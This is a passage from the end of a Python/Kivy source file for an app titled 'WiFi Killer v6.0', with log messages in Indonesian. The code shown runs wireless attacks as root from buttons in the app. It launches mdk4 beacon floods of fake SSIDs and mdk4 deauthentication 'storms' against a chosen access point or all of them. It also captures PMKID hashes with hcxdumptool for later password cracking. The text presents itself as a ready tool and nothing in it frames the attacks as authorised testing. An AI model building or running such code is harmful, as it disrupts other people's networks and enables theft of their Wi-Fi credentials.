                root_run(f'airmon-ng stop {self._mon_iface}')
                self._mon_on = False
                def _ui2(*a):
                    self._mon_btn.text  = '▶ START'
                    self._mon_btn.color = C_TEAL
                    self._log('[mon] managed mode restored', 'warn')
                Clock.schedule_once(_ui2, 0)
        threading.Thread(target=_run, daemon=True).start()

    def _toggle_ch_hop(self, *a):
        if not IS_ROOT:
            self._log('[root] butuh ROOT', 'err'); return
        self._ch_hop_running = not self._ch_hop_running
        if self._ch_hop_running:
            self._ch_btn.text  = '■ STOP'
            self._ch_btn.color = C_RED
            self._log(f'[hop] channel hopper aktif — {self._mon_iface}', 'ok')
            def _hop():
                ch = 1
                while self._ch_hop_running:
                    root_run(f'iwconfig {self._mon_iface} channel {ch}')
                    ch = (ch % 13) + 1
                    time.sleep(0.3)
            self._ch_hop_thread = threading.Thread(target=_hop, daemon=True)
            self._ch_hop_thread.start()
        else:
            self._ch_btn.text  = '▶ HOP'
            self._ch_btn.color = C_BLUE
            self._log('[hop] channel hopper berhenti', 'warn')

    def _root_airodump(self, *a):
        if not IS_ROOT:
            self._log('[root] butuh ROOT', 'err'); return
        if not self._mon_on:
            self._log('[root] aktifkan monitor mode dulu', 'warn'); return
        self._log(f'[dump] airodump-ng 10s → {self._mon_iface}', 'info')
        def _run():
            root_run(f'airodump-ng --write-interval 2 '
                     f'--output-format csv -w /tmp/rdump '
                     f'{self._mon_iface}', timeout=12)
            self._log('[dump] selesai → /tmp/rdump-01.csv', 'ok')
        threading.Thread(target=_run, daemon=True).start()

    def _root_mdk4_beacon(self, *a):
        if not IS_ROOT:
            self._log('[root] butuh ROOT', 'err'); return
        if not self._mon_on:
            self._log('[root] aktifkan monitor mode dulu', 'warn'); return
        self._mdk4_running = not self._mdk4_running
        if self._mdk4_running:
            self._mdk4_btn.text  = '■ STOP'
            self._mdk4_btn.color = C_RED
            self._log('[mdk4] beacon flood start — ratusan SSID palsu...', 'err')
            ch = self._selected_ap['ch'] if self._selected_ap else '1'
            def _run():
                # -b: broadcast, -n random SSID, -c channel
                proc = root_popen(
                    f'mdk4 {self._mon_iface} b -c {ch} -s 1000')
                while self._mdk4_running:
                    time.sleep(0.5)
                try:
                    proc.terminate()
                except Exception:
                    pass
                Clock.schedule_once(lambda *a: (
                    setattr(self._mdk4_btn, 'text', '▶ FLOOD'),
                    setattr(self._mdk4_btn, 'color', C_RED),
                    self._log('[mdk4] beacon flood berhenti', 'warn')
                ), 0)
            threading.Thread(target=_run, daemon=True).start()
        else:
            self._mdk4_running = False

    def _root_mdk4_deauth(self, *a):
        if not IS_ROOT:
            self._log('[root] butuh ROOT', 'err'); return
        if not self._mon_on:
            self._log('[root] aktifkan monitor mode dulu', 'warn'); return
        self._mdk4d_running = not self._mdk4d_running
        if self._mdk4d_running:
            self._mdk4d_btn.text  = '■ STOP'
            self._mdk4d_btn.color = C_RED
            ap = self._selected_ap
            bssid_flag = f'-B {ap["bssid"]}' if ap else ''
            self._log(f'[mdk4d] deauth storm → {ap["bssid"] if ap else "semua"}', 'err')
            def _run():
                proc = root_popen(
                    f'mdk4 {self._mon_iface} d {bssid_flag} -s 1000')
                while self._mdk4d_running:
                    time.sleep(0.5)
                try:
                    proc.terminate()
                except Exception:
                    pass
                Clock.schedule_once(lambda *a: (
                    setattr(self._mdk4d_btn, 'text', '▶ STORM'),
                    setattr(self._mdk4d_btn, 'color', C_RED),
                    self._log('[mdk4d] deauth storm berhenti', 'warn')
                ), 0)
            threading.Thread(target=_run, daemon=True).start()
        else:
            self._mdk4d_running = False

    def _root_pmkid(self, *a):
        if not IS_ROOT:
            self._log('[root] butuh ROOT', 'err'); return
        if not self._mon_on:
            self._log('[root] aktifkan monitor mode dulu', 'warn'); return
        self._log('[pmkid] hcxdumptool 30s...', 'warn')
        def _run():
            bssid = self._selected_ap['bssid'] if self._selected_ap else ''
            flag  = f'-E {bssid}' if bssid else ''
            root_run(f'hcxdumptool -i {self._mon_iface} {flag} '
                     f'-o /tmp/pmkid.pcapng --enable_status=3', timeout=32)
            self._log('[pmkid] selesai → /tmp/pmkid.pcapng', 'ok')
        threading.Thread(target=_run, daemon=True).start()


# ── iwlist fallback parser ────────────────────────────────────────────────────────
def _parse_iwlist(raw: str) -> list:
    aps = []
    current = {}
    for line in raw.splitlines():
        line = line.strip()
        m = re.search(r'Address:\s*([0-9A-Fa-f:]{17})', line)
        if m:
            if current:
                aps.append(current)
            current = {'ssid':'','bssid':m.group(1),'pwr':'0',
                       'ch':'0','freq':'0','enc':'?','caps':''}
        m2 = re.search(r'ESSID:"(.*?)"', line)
        if m2 and current:
            current['ssid'] = m2.group(1)
        m3 = re.search(r'Signal level=(-\d+)', line)
        if m3 and current:
            current['pwr'] = m3.group(1)
        m4 = re.search(r'Channel[:\s]+(\d+)', line)
        if m4 and current:
            current['ch'] = m4.group(1)
        if 'WPA2' in line and current:
            current['enc'] = 'WPA2'
        elif 'WPA' in line and current:
            current['enc'] = 'WPA'
    if current:
        aps.append(current)
    return aps


# ── app ──────────────────────────────────────────────────────────────────────────
class WiFiKillerApp(App):
    def build(self):
        self.title = 'WiFi Killer v6.0 — NETACT × BOWOgaming'
        return WiFiKillerRoot()


if __name__ == '__main__':
    WiFiKillerApp().run()
